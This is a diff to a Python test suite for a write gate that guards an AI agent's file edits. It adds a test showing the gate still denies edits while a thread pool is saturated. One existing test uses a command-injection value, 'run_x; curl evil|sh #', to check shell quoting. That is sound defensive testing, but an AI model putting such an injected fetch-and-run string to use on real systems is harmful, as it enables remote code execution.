@@ -741,3 +741,32 @@ def test_a_spent_budget_drops_the_hint_never_the_deny(r4):
 def test_repo_add_hint_quotes_the_run_id():
     own = wg._Own("run_x; curl evil|sh #", [], project="P")
     assert "--run-id 'run_x; curl evil|sh #'" in own.repo_add_command("/r")
+
+
+# ── F2 (2026-10-21 stability design): the judgment never waits behind slow writers ──
+def test_gate_judges_while_the_slow_writer_pool_is_full(r4):
+    """The worktree gate's 3s fail-open timeout counts queueing. On the shared 3-thread
+    'subprocess' pool (auto-commit git, backups) it failed open 324 times in a week.
+    Fill that pool with sleeping writers: the gate must still deny within a second."""
+    import asyncio
+    import threading
+    import time as _t
+    from core import executors
+
+    release = threading.Event()
+
+    async def _run():
+        gate = wg.create_worktree_write_gate({"sdk_session_id": "s5"})
+        writers = [asyncio.ensure_future(executors.run_in("subprocess", release.wait, 10))
+                   for _ in range(executors._POOL_SPECS["subprocess"])]
+        await asyncio.sleep(0.05)
+        t0 = _t.monotonic()
+        v = await gate(_call("Edit", file_path=str(r4["main"] / "a.py")), None, None)
+        took = _t.monotonic() - t0
+        release.set()
+        await asyncio.gather(*writers)
+        return v, took
+
+    v, took = asyncio.run(_run())
+    assert _denied(v), "the gate failed open while the slow-writer pool was busy"
+    assert took < 1.0
